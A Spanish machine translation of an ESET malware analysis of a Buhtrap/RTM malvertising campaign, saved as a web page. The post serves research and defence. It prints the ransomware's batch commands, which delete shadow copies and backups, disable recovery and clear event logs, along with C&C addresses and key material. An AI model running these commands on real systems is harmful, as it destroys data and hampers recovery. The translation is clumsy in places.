<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üö¨ üèæ üôåüèø La puerta trasera y el encriptador Buhtrap se distribuyeron usando Yandex.Direct üë©üèæ‚Äçüç≥ üë®üèΩ‚Äçüé§ ü§üüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Para apuntar a un ataque cibern√©tico contra los contadores, puede usar los documentos de trabajo que est√°n buscando en la red. Algo as√≠ en los √∫ltimos...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>La puerta trasera y el encriptador Buhtrap se distribuyeron usando Yandex.Direct</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/450126/"> Para apuntar a un ataque cibern√©tico contra los contadores, puede usar los documentos de trabajo que est√°n buscando en la red.  Algo as√≠ en los √∫ltimos meses ha sido un grupo cibern√©tico que distribuye las conocidas puertas traseras <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Buhtrap</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">RTM</a> , as√≠ como encriptadores y software para robar criptomonedas.  La mayor√≠a de los objetivos se encuentran en Rusia.  El ataque se implementa colocando anuncios maliciosos en Yandex.Direct.  Las posibles v√≠ctimas fueron a un sitio donde se les pidi√≥ que descargaran un archivo malicioso disfrazado de plantilla de documento.  Yandex elimin√≥ los anuncios maliciosos despu√©s de nuestra advertencia. <br><br>  El c√≥digo fuente de Buhtrap se ha fusionado en la red en el pasado, por lo que cualquiera puede usarlo.  No tenemos informaci√≥n sobre la disponibilidad del c√≥digo RTM. <br><br>  En una publicaci√≥n, diremos c√≥mo los atacantes distribuyeron malware usando Yandex.Direct y lo alojaron en GitHub.  La publicaci√≥n se completar√° con un an√°lisis t√©cnico de los malvari. <br><br><img src="https://habrastorage.org/webt/y3/h0/ly/y3h0lyhh0aq4jl6dwpvaia-vf2q.png"><br><br><a name="habracut"></a><h2>  Buhtrap y RTM vuelven a los negocios </h2><br><h4>  Mecanismo de distribuci√≥n y v√≠ctimas </h4><br>  Las diversas cargas √∫tiles entregadas a las v√≠ctimas est√°n unidas por un mecanismo de distribuci√≥n com√∫n.  Todos los archivos maliciosos creados por cibercriminales se ubicaron en dos repositorios diferentes de GitHub. <br><br>  Por lo general, en el repositorio hab√≠a un archivo malicioso descargado, que a menudo cambiaba.  Como puede ver el historial de cambios en el repositorio en GitHub, podemos ver qu√© tipo de malware se propag√≥ durante un per√≠odo determinado.  Para convencer a la v√≠ctima de descargar un archivo malicioso, se utiliz√≥ el sitio blanki-shabloni24 [.] Ru, que se muestra en la figura anterior. <br><br>  El dise√±o del sitio y todos los nombres de los archivos maliciosos son consistentes en un solo concepto: formularios, plantillas, contratos, muestras, etc. Dado que en el pasado el software Buhtrap y RTM ya se usaban en ataques contra contadores, asumimos que la estrategia es la misma en la nueva campa√±a.  La √∫nica pregunta es c√≥mo lleg√≥ la v√≠ctima al sitio de los atacantes. <br><br><h4>  Infecci√≥n </h4><br>  Al menos unas pocas v√≠ctimas potenciales en este sitio fueron atra√≠das por publicidad maliciosa.  El siguiente es un ejemplo de URL: <br><br> <code>https://blanki-shabloni24.ru/?utm_source=yandex&amp;utm_medium=banner&amp;utm_campaign=cid|{blanki_rsya}|context&amp;utm_content=gid|3590756360|aid|6683792549|15114654950_&amp;utm_term=  &amp;pm_source=bb.f2.kz&amp;pm_block=none&amp;pm_position=0&amp;yclid=1029648968001296456</code> <br> <br>  Como puede ver en el enlace, el banner fue publicado en el foro de contabilidad leg√≠tima bb.f2 [.] Kz.  Es importante tener en cuenta que los banners aparecieron en diferentes sitios, todos ten√≠an la misma identificaci√≥n de campa√±a (blanki_rsya) y la mayor√≠a estaban relacionados con los servicios de contabilidad o asistencia legal.  Se puede ver en la URL que la v√≠ctima potencial us√≥ el "formulario de cuenta de descarga" de la solicitud, lo que refuerza nuestra hip√≥tesis sobre los ataques dirigidos.  A continuaci√≥n se enumeran los sitios donde aparecieron los banners y las b√∫squedas relacionadas. <br><br><ul><li>  descargar formulario de cuenta - bb.f2 [.] kz </li><li>  muestra de contrato - Ipopen [.] en </li><li>  muestra de queja de declaraci√≥n - 77metrov [.] ru </li><li>  formulario de contrato - blank-dogovor-kupli-prodazhi [.] es </li><li>  muestra de petici√≥n - zen.yandex [.] ru </li><li>  ejemplo de queja - jueves [.] es </li><li>  ejemplos de formularios de contrato - Regforum [.] es </li><li>  forma de contrato - assistentus [.] es </li><li>  muestra de acuerdo de apartamento - napravah [.] com </li><li>  muestras de contratos legales - avito [.] ru </li></ul><br>  El sitio blanki-shabloni24 [.] Ru puede haber sido configurado para pasar por una evaluaci√≥n visual simple.  Como regla general, la publicidad que conduce a un sitio de aspecto profesional con un enlace a GitHub no parece algo obviamente malo.  Adem√°s, los atacantes subieron archivos maliciosos al repositorio solo durante un per√≠odo limitado, probablemente durante la campa√±a.  La mayor parte del repositorio en GitHub era un archivo zip vac√≠o o un archivo exe limpio.  Por lo tanto, los atacantes podr√≠an distribuir publicidad a trav√©s de Yandex.Direct en sitios que probablemente fueron visitados por contadores que acudieron a consultas de b√∫squeda espec√≠ficas. <br><br>  A continuaci√≥n, considere las diversas cargas √∫tiles distribuidas de esta manera. <br><br><h2>  An√°lisis de carga √∫til </h2><br><h4>  Cronolog√≠a de distribuci√≥n </h4><br>  La campa√±a de malware comenz√≥ a fines de octubre de 2018 y est√° activa en el momento de escribir la publicaci√≥n.  Como todo el repositorio estaba disponible p√∫blicamente en GitHub, compilamos una cronolog√≠a precisa de la distribuci√≥n de seis familias diferentes de malware (consulte la figura a continuaci√≥n).  Agregamos una l√≠nea que muestra el momento en que se detect√≥ un enlace de banner, seg√∫n la telemetr√≠a de ESET, para compararlo con el historial de git.  Como puede ver, esto se correlaciona bien con la disponibilidad de la carga √∫til en GitHub.  La discrepancia a fines de febrero puede explicarse por nuestra falta de parte del historial de cambios, ya que el repositorio se elimin√≥ de GitHub antes de que pudi√©ramos obtenerlo por completo. <br><br><img src="https://habrastorage.org/webt/sa/ua/1i/saua1i6vupxtv2pa-tvwawje8em.png"><br>  <i>Figura 1. Cronolog√≠a de la distribuci√≥n de malvari.</i> <br><br><h4>  Certificado Firma Certificados </h4><br>  La campa√±a us√≥ muchos certificados.  Algunos han firmado m√°s de una familia de malware, lo que adem√°s indica que diferentes muestras pertenecen a la misma campa√±a.  A pesar de la disponibilidad de la clave privada, los operadores no firmaron los archivos binarios sistem√°ticamente y no utilizaron la clave para todas las muestras.  A finales de febrero de 2019, los atacantes comenzaron a crear firmas inv√°lidas utilizando un certificado propiedad de Google, para el cual no tienen una clave privada. <br><br>  Todos los certificados involucrados en la campa√±a y las familias Malvari que firman se enumeran en la tabla a continuaci√≥n. <br><br><img src="https://habrastorage.org/webt/wg/q_/-8/wgq_-807r6mtilzeam28lhbbrvi.png"><br><br>  Tambi√©n utilizamos estos certificados de firma de c√≥digo para comunicarnos con otras familias de malware.  Para la mayor√≠a de los certificados, no encontramos muestras que no se distribuir√≠an a trav√©s del repositorio de GitHub.  Sin embargo, el certificado TOV "MARIYA" se us√≥ para firmar el Malvari, propiedad de la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">botnet</a> Wauchos, adware y mineros.  Es poco probable que este malware se asocie con esta campa√±a.  Lo m√°s probable es que el certificado se haya comprado en la darknet. <br><br><h4>  Win32 / Filecoder.Buhtrap </h4><br>  El primer componente que llam√≥ nuestra atenci√≥n fue el primer Win32 / Filecoder.Buhtrap descubierto.  Este es un archivo binario de Delphi que a veces se puede empaquetar.  Se distribuy√≥ principalmente en febrero - marzo de 2019.  Se comporta como deber√≠a ser un programa de ransomware: busca discos locales y carpetas de red y cifra los archivos detectados.  Para comprometerse, no necesita una conexi√≥n a Internet, ya que no se pone en contacto con el servidor para enviar claves de cifrado.  En cambio, agrega un "token" al final del mensaje de recompra y sugiere usar el correo electr√≥nico o Bitmessage para comunicarse con los operadores. <br><br>  Para cifrar tantos recursos importantes como sea posible, Filecoder.Buhtrap lanza una secuencia dise√±ada para cerrar el software clave, que puede tener controladores de archivos abiertos con informaci√≥n valiosa, que pueden interferir con el cifrado.  Los procesos objetivo son principalmente sistemas de gesti√≥n de bases de datos (DBMS).  Adem√°s, Filecoder.Buhtrap elimina archivos de registro y copias de seguridad para dificultar la recuperaci√≥n de datos.  Para hacer esto, se ejecuta el script por lotes a continuaci√≥n. <br><br> <code>bcdedit /set {default} bootstatuspolicy ignoreallfailures <br> bcdedit /set {default} recoveryenabled no <br> wbadmin delete catalog -quiet <br> wbadmin delete systemstatebackup <br> wbadmin delete systemstatebackup -keepversions:0 <br> wbadmin delete backup <br> wmic shadowcopy delete <br> vssadmin delete shadows /all /quiet <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f <br> reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" <br> attrib "%userprofile%\documents\Default.rdp" -s -h <br> del "%userprofile%\documents\Default.rdp" <br> wevtutil.exe clear-log Application <br> wevtutil.exe clear-log Security <br> wevtutil.exe clear-log System <br> sc config eventlog start=disabled</code> <br> <br>  Filecoder.Buhtrap utiliza el servicio en l√≠nea leg√≠timo IP Logger, creado para recopilar informaci√≥n sobre los visitantes del sitio.  Esto est√° destinado a rastrear a las v√≠ctimas del codificador, de las cuales la l√≠nea de comando es responsable: <br><br> <code>mshta.exe "javascript:document.write('');"</code> <br> <br>  Los archivos para el cifrado se seleccionan en caso de desajuste en las tres listas de excepciones.  En primer lugar, los archivos con las siguientes extensiones no est√°n cifrados: .com, .cmd, .cpl, .dll, .exe, .hta, .lnk, .msc, .msi, .msp, .pif, .scr, .sys y .bat.  En segundo lugar, se excluyen todos los archivos para los que la ruta completa contiene l√≠neas de directorio de la lista a continuaci√≥n. <br><br> <code>\.{ED7BA470-8E54-465E-825C-99712043E01C}\ <br> \tor browser\ <br> \opera\ <br> \opera software\ <br> \mozilla\ <br> \mozilla firefox\ <br> \internet explorer\ <br> \google\chrome\ <br> \google\ <br> \boot\ <br> \application data\ <br> \apple computer\safari\ <br> \appdata\ <br> \all users\ <br> :\windows\ <br> :\system volume information\ <br> :\nvidia\ <br> :\intel\</code> <br> <br>  En tercer lugar, ciertos nombres de archivo tambi√©n se excluyen del cifrado, entre ellos el nombre del archivo de mensaje con una demanda de rescate.  La lista se presenta a continuaci√≥n.  Obviamente, todas estas excepciones est√°n dise√±adas para preservar la capacidad de iniciar la m√°quina, pero con su m√≠nima usabilidad. <br><br> <code>boot.ini <br> bootfont.bin <br> bootsect.bak <br> desktop.ini <br> iconcache.db <br> ntdetect.com <br> ntldr <br> ntuser.dat <br> ntuser.dat.log <br> ntuser.ini <br> thumbs.db <br> winupas.exe <br> your files are now encrypted.txt <br> windows update assistant.lnk <br> master.exe <br> unlock.exe <br> unlocker.exe</code> <br> <br><h4>  Esquema de cifrado de archivos </h4><br>  Una vez lanzado, el malware genera un par de claves RSA de 512 bits.  El exponente privado (d) y el m√≥dulo (n) se cifran con una clave p√∫blica codificada de 2048 bits (exponente p√∫blico y m√≥dulo), envuelta en zlib y codificada en base64.  El c√≥digo responsable de esto se muestra en la Figura 2. <br><br><img src="https://habrastorage.org/webt/c_/p_/g9/c_p_g9rfnoggxyffe9jedxgibrk.png"><br>  <i>Figura 2. El resultado de la descompilaci√≥n de rayos hexadecimales del proceso de generaci√≥n de un par de claves RSA de 512 bits.</i> <br><br>  El siguiente es un ejemplo de texto sin formato con una clave privada generada, que es un token adjunto al mensaje de rescate. <br><br> <code>DF9228F4F3CA93314B7EE4BEFC440030665D5A2318111CC3FE91A43D781E3F91BD2F6383E4A0B4F503916D75C9C576D5C2F2F073ADD4B237F7A2B3BF129AE2F399197ECC0DD002D5E60C20CE3780AB9D1FE61A47D9735036907E3F0CF8BE09E3E7646F8388AAC75FF6A4F60E7F4C2F697BF6E47B2DBCDEC156EAD854CADE53A239</code> <br> <br>  La clave p√∫blica de los atacantes se muestra a continuaci√≥n. <br><br> <code>e = 0x72F750D7A93C2C88BFC87AD4FC0BF4CB45E3C55701FA03D3E75162EB5A97FDA7ACF8871B220A33BEDA546815A9AD9AA0C2F375686F5009C657BB3DF35145126C71E3C2EADF14201C8331699FD0592C957698916FA9FEA8F0B120E4296193AD7F3F3531206608E2A8F997307EE7D14A9326B77F1B34C4F1469B51665757AFD38E88F758B9EA1B95406E72B69172A7253F1DFAA0FA02B53A2CC3A7F0D708D1A8CAA30D954C1FEAB10AD089EFB041DD016DCAAE05847B550861E5CACC6A59B112277B60AC0E4E5D0EA89A5127E93C2182F77FDA16356F4EF5B7B4010BCCE1B1331FCABFFD808D7DAA86EA71DFD36D7E701BD0050235BD4D3F20A97AAEF301E785005 <br> n = 0x212ED167BAC2AEFF7C3FA76064B56240C5530A63AB098C9B9FA2DE18AF9F4E1962B467ABE2302C818860F9215E922FC2E0E28C0946A0FC746557722EBB35DF432481AC7D5DDF69468AF1E952465E61DDD06CDB3D924345A8833A7BC7D5D9B005585FE95856F5C44EA917306415B767B684CC85E7359C23231C1DCBBE714711C08848BEB06BD287781AEB53D94B7983EC9FC338D4320129EA4F568C410317895860D5A85438B2DA6BB3BAAE9D9CE65BCEA6760291D74035775F28DF4E6AB1A748F78C68AB07EA166A7309090202BB3F8FBFC19E44AC0B4D3D0A37C8AA5FA90221DA7DB178F89233E532FF90B55122B53AB821E1A3DB0F02524429DEB294B3A4EDD</code> <br> <br>  Los archivos se cifran con AES-128-CBC con una clave de 256 bits.  Para cada archivo encriptado, se genera una nueva clave y un nuevo vector de inicializaci√≥n.  La informaci√≥n clave se agrega al final del archivo encriptado.  Considere el formato de archivo cifrado. <br>  Los archivos cifrados tienen el siguiente encabezado: <br><br><img src="https://habrastorage.org/webt/lo/-e/7m/lo-e7mo1l2ta7ie0n2rlz0ybirs.png"><br><br>  Los datos del archivo fuente con la adici√≥n del valor m√°gico VEGA se cifran hasta los primeros 0x5000 bytes.  Toda la informaci√≥n para descifrar se adjunta a un archivo con la siguiente estructura: <br><br><img src="https://habrastorage.org/webt/iw/hy/az/iwhyaz2vw5c45i6vk0s4hs_sadq.png"><br><br>  - El marcador de tama√±o de archivo contiene una etiqueta que indica si el archivo es mayor que 0x5000 bytes <br>  - AES key blob = ZlibCompress (RSAEncrypt (clave AES + IV, clave p√∫blica del par de claves RSA generado) <br>  - Bloque de claves RSA = ZlibCompress (RSAEncrypt (clave privada RSA generada, clave p√∫blica RSA codificada)) <br><br><h4>  Win32 / ClipBanker </h4><br>  Win32 / ClipBanker es un componente que se ha distribuido de manera intermitente desde finales de octubre hasta principios de diciembre de 2018.  Su funci√≥n es rastrear el contenido del portapapeles, busca las direcciones de las billeteras de criptomonedas.  Habiendo determinado la direcci√≥n de la billetera objetivo, ClipBanker la reemplaza con la direcci√≥n supuestamente perteneciente a los operadores.  Las muestras que estudiamos no estaban empaquetadas ni ofuscadas.  El √∫nico mecanismo utilizado para enmascarar el comportamiento es el cifrado de cadenas.  Las direcciones de las billeteras de los operadores se cifran con RC4.  Criptomonedas objetivo: Bitcoin, Bitcoin cash, Dogecoin, Ethereum y Ripple. <br><br>  Durante el per√≠odo de distribuci√≥n de malware, se envi√≥ una peque√±a cantidad al MTC a las billeteras Bitcoin del atacante, lo que arroja dudas sobre el √©xito de la campa√±a.  Adem√°s, no hay raz√≥n para suponer que estas transacciones generalmente estaban relacionadas con ClipBanker. <br><br><h4>  Win32 / RTM </h4><br>  El componente Win32 / RTM se distribuy√≥ durante varios d√≠as a principios de marzo de 2019.  RTM es un banquero troyano basado en Delphi dirigido a sistemas bancarios remotos.  En 2017, los investigadores de ESET publicaron un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">an√°lisis detallado de</a> este programa, la descripci√≥n sigue siendo relevante.  En enero de 2019, Palo Alto Networks tambi√©n lanz√≥ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">una publicaci√≥n de blog sobre RTM</a> . <br><br><h4>  Descargador de Buhtrap </h4><br>  Durante alg√∫n tiempo, un descargador estuvo disponible en GitHub, a diferencia de las herramientas anteriores de Buhtrap.  Va a <code>https://94.100.18[.]67/RSS.php?&lt;some_id&gt;</code> para el siguiente paso y lo carga directamente en la memoria.  Se pueden distinguir dos comportamientos del c√≥digo de la segunda etapa.  En la primera URL, RSS.php pas√≥ la puerta trasera de Buhtrap directamente; esta puerta trasera es muy similar a la disponible despu√©s de la fuga del c√≥digo fuente. <br><br>  Curiosamente, vemos varias campa√±as con una puerta trasera Buhtrap, y presumiblemente est√°n dirigidas por diferentes operadores.  En este caso, la principal diferencia es que la puerta trasera se carga directamente en la memoria y no utiliza el esquema habitual con el proceso de implementaci√≥n de DLL, del que hablamos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">anteriormente</a> .  Adem√°s, los operadores cambiaron la clave RC4 utilizada para encriptar el tr√°fico de red al servidor C&amp;C.  En la mayor√≠a de las campa√±as que vimos, a los operadores no les importaba cambiar esta clave. <br><br>  El segundo comportamiento, m√°s complejo: la URL RSS.php fue pasada por otro cargador.  Implement√≥ cierta ofuscaci√≥n, como la reconstrucci√≥n de una tabla de importaci√≥n din√°mica.  El prop√≥sito del gestor de arranque es contactar al servidor C&amp;C <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">msiofficeupd</a> [.] Com / api / F27F84EDA4D13B15 / 2, enviar registros y esperar una respuesta.  Procesa la respuesta como un blob, la carga en la memoria y se ejecuta.  La carga √∫til que vimos al ejecutar este cargador era la misma puerta trasera de Buhtrap, pero puede haber otros componentes. <br><br><h4>  Android / Spy.Banker </h4><br>  Curiosamente, tambi√©n se encontr√≥ un componente para Android en el repositorio de GitHub.  Estuvo en la sucursal principal solo por un d√≠a: 1 de noviembre de 2018.  Adem√°s de estar alojado en GitHub, la telemetr√≠a de ESET no encuentra evidencia de la propagaci√≥n de este malware. <br><br>  El componente se aloj√≥ como un paquete de aplicaciones de Android (APK).  Est√° muy ofuscado.  El comportamiento malicioso est√° oculto en el JAR cifrado ubicado en el APK.  Est√° encriptado RC4 con esta clave: <br><br> <code>key = [ <br> 0x87, 0xd6, 0x2e, 0x66, 0xc5, 0x8a, 0x26, 0x00, 0x72, 0x86, 0x72, 0x6f, <br> 0x0c, 0xc1, 0xdb, 0xcb, 0x14, 0xd2, 0xa8, 0x19, 0xeb, 0x85, 0x68, 0xe1, <br> 0x2f, 0xad, 0xbe, 0xe3, 0xb9, 0x60, 0x9b, 0xb9, 0xf4, 0xa0, 0xa2, 0x8b, 0x96 <br> ]</code> <br> <br>  La misma clave y algoritmo se utilizan para cifrar cadenas.  JAR se encuentra en <code>APK_ROOT + image/files</code> .  Los primeros 4 bytes del archivo contienen la longitud del JAR cifrado, que comienza inmediatamente despu√©s del campo de longitud. <br><br>  Despu√©s de descifrar el archivo, descubrimos que es Anubis, un banquero previamente <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">documentado</a> para Android.  El software malicioso tiene las siguientes funciones: <br><br><ul><li>  grabaci√≥n de micr√≥fono </li><li>  tomando capturas de pantalla </li><li>  obtenci√≥n de coordenadas GPS </li><li>  keylogger </li><li>  cifrado de datos del dispositivo y demanda de rescate </li><li>  spam </li></ul><br>  Curiosamente, el banquero us√≥ Twitter como un canal de comunicaci√≥n de respaldo para obtener otro servidor de C&amp;C.  La muestra que analizamos utiliz√≥ la cuenta @JohnesTrader, pero en el momento del an√°lisis ya estaba bloqueada. <br><br>  El banco contiene una lista de aplicaciones espec√≠ficas en un dispositivo Android.  Se ha vuelto m√°s larga que la lista obtenida del estudio de Sophos.  La lista contiene muchas aplicaciones bancarias, programas de compras en l√≠nea como Amazon y eBay, servicios de criptomonedas. <br><br><h4>  MSIL / ClipBanker.IH </h4><br>  El √∫ltimo componente que se distribuy√≥ como parte de esta campa√±a fue el ejecutable .NET de Windows, que apareci√≥ en marzo de 2019.  La mayor√≠a de las versiones estudiadas fueron empaquetadas por ConfuserEx v1.0.0.  Al igual que ClipBanker, este componente usa el portapapeles.  Su objetivo es una amplia gama de criptomonedas, as√≠ como ofertas en Steam.  Adem√°s, utiliza el servicio IP Logger para robar la clave WIF privada de Bitcoin. <br><br>  Mecanismos de protecci√≥n <br>  Adem√°s de las ventajas que brinda ConfuserEx en la forma de contrarrestar la depuraci√≥n, el volcado y la manipulaci√≥n, el componente tiene la capacidad de detectar productos antivirus y m√°quinas virtuales. <br><br>  Para verificar el inicio en una m√°quina virtual, el malware utiliza la l√≠nea de comandos WMI (WMIC) incorporada de Windows para solicitar informaci√≥n sobre el BIOS, a saber: <br><br> <code>wmic bios</code> <br> <br>  Luego, el programa analiza la salida del comando y busca palabras clave: VBOX, VirtualBox, XEN, qemu, bochs, VM. <br><br>  Para detectar productos antivirus, el malware env√≠a una solicitud de Instrumental de administraci√≥n de Windows (WMI) al Centro de seguridad de Windows utilizando la API <code>ManagementObjectSearcher</code> como se muestra a continuaci√≥n.  Despu√©s de decodificar desde base64, la llamada se ve as√≠: <br><br> <code>ManagementObjectSearcher('root\\SecurityCenter2', 'SELECT * FROM AntivirusProduct')</code> <br> <br><img src="https://habrastorage.org/webt/wb/xv/tv/wbxvtvcwmxo9w45kjramkqmcy-s.png"><br>  <i>Figura 3. El proceso de determinaci√≥n de productos antivirus.</i> <br><br>  Adem√°s, el malware comprueba si <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">CryptoClipWatcher</a> , una herramienta para protegerse contra los ataques del portapapeles, se est√° ejecutando, y si se est√° ejecutando, detiene todos los hilos de este proceso, desactivando as√≠ la protecci√≥n. <br><br><h4>  Persistencia </h4><br>  La versi√≥n de malware que estudiamos se copia a <code>%APPDATA%\google\updater.exe</code> y establece el atributo "oculto" en el directorio de google.  Luego cambia el valor de <code>Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell</code> en el registro de Windows y agrega la ruta <code>updater.exe</code> .  Por lo tanto, el malware se ejecutar√° cada vez que un usuario inicie sesi√≥n. <br><br><h4>  Comportamiento malicioso </h4><br>  Al igual que ClipBanker, el malware monitorea el contenido del portapapeles y busca las direcciones de las billeteras de criptomonedas, y cuando lo encuentra, lo reemplaza con una de las direcciones del operador.  A continuaci√≥n se muestra una lista de direcciones de destino basadas en lo que se encontr√≥ en el c√≥digo. <br><br> <code>BTC_P2PKH, BTC_P2SH, BTC_BECH32, BCH_P2PKH_CashAddr, BTC_GOLD, LTC_P2PKH, LTC_BECH32, LTC_P2SH_M, ETH_ERC20, XMR, DCR, XRP, DOGE, DASH, ZEC_T_ADDR, ZEC_Z_ADDR, STELLAR, NEO, ADA, IOTA, NANO_1, NANO_3, BANANO_1, BANANO_3, STRATIS, NIOBIO, LISK, QTUM, WMZ, WMX, WME, VERTCOIN, TRON, TEZOS, QIWI_ID, YANDEX_ID, NAMECOIN, B58_PRIVATEKEY, STEAM_URL</code> <br> <br>  Para cada tipo de direcci√≥n hay una expresi√≥n regular correspondiente.  El valor STEAM_URL se usa para atacar el sistema Steam, como se puede ver en la expresi√≥n regular, que se usa para determinar en el b√∫fer: <br><br> <code>\b(https:\/\/|http:\/\/|)steamcommunity\.com\/tradeoffer\/new\/\?partner=[0-9]+&amp;token=[a-zA-Z0-9]+\b</code> <br> <br><h4>  Canal de exfiltraci√≥n </h4><br>  Adem√°s de reemplazar las direcciones en el b√∫fer, el malware est√° dirigido a las claves WIF privadas de las billeteras Bitcoin, Bitcoin Core y Electrum Bitcoin.  El programa utiliza plogger.org como canal de exfiltraci√≥n para obtener la clave privada WIF.  Para hacer esto, los operadores agregan los datos de la clave privada al encabezado HTTP User-Agent, como se muestra a continuaci√≥n. <br><br><img src="https://habrastorage.org/webt/fz/xc/us/fzxcusdwmjnv8irew2lhlnlg7ss.png"><br>  <i>Figura 4. Consola IP Logger con salida.</i> <br><br>  Los operadores no utilizaron iplogger.org para filtrar billeteras.  Probablemente recurrieron a un m√©todo diferente debido a la restricci√≥n de 255 caracteres en el campo <code>User-Agent</code> muestra en la interfaz web de IP Logger.  En las muestras que estudiamos, otro servidor para generar datos se almacen√≥ en la <code>DiscordWebHook</code> entorno <code>DiscordWebHook</code> .  Sorprendentemente, esta variable de entorno no est√° asignada en ninguna parte del c√≥digo.  Esto sugiere que el malware todav√≠a est√° en desarrollo y que la variable se asigna en la m√°quina de prueba del operador. <br><br>  Hay otra se√±al de que el programa est√° en desarrollo.  El binario incluye dos URL de iplogger.org, y se env√≠a una solicitud a ambas cuando se extraen los datos.  En una solicitud a una de estas URL, el valor en el campo Referer est√° precedido por "DEV /".  Tambi√©n encontramos una versi√≥n que no estaba empaquetada con ConfuserEx, el destinatario de esta URL se llama DevFeedbackUrl.  Seg√∫n el nombre de la variable de entorno, creemos que los operadores planean usar el servicio leg√≠timo Discord y su sistema de intercepci√≥n web para robar billeteras de criptomonedas. <br><br><h2>  Conclusi√≥n </h2><br>  Esta campa√±a es un ejemplo del uso de servicios de publicidad leg√≠timos en ciberataques.  El esquema est√° dirigido a organizaciones rusas, pero no nos sorprender√° ver tal ataque utilizando servicios no rusos.  Para evitar compromisos, los usuarios deben confiar en la reputaci√≥n de la fuente del software descargado. <br><br>  Una lista completa de los indicadores de compromiso y atributos de MITER ATT &amp; CK est√° disponible <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/450126/">https://habr.com/ru/post/450126/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../450116/index.html">Sistemas operativos: tres piezas f√°ciles. Parte 5: Planificaci√≥n: Cola de comentarios de varios niveles (traducci√≥n)</a></li>
<li><a href="../450118/index.html">Transmita la pantalla a m√∫ltiples dispositivos a trav√©s de la red</a></li>
<li><a href="../450120/index.html">Busque im√°genes similares, analizando un solo algoritmo</a></li>
<li><a href="../450122/index.html">Startup Digest: Genetics (enero - marzo 2019)</a></li>
<li><a href="../450124/index.html">Configuraci√≥n de mapas OsmAnd de la capa de mapa de calor de Strava</a></li>
<li><a href="../450128/index.html">Uso de la √≥ptica Minolta AF (Sony A-mount) en las modernas c√°maras sin espejo de Sony</a></li>
<li><a href="../450130/index.html">¬øSobreviven los equipos despu√©s del hackathon?</a></li>
<li><a href="../450132/index.html">Incapaz de explicar m√≥nada</a></li>
<li><a href="../450134/index.html">La segunda vida de los anillos y los broches: c√≥mo recrear r√°pidamente las joyas con tecnolog√≠a 3D</a></li>
<li><a href="../450136/index.html">Cuando las paredes no son suficientes. C√≥mo proteger los puntos finales</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
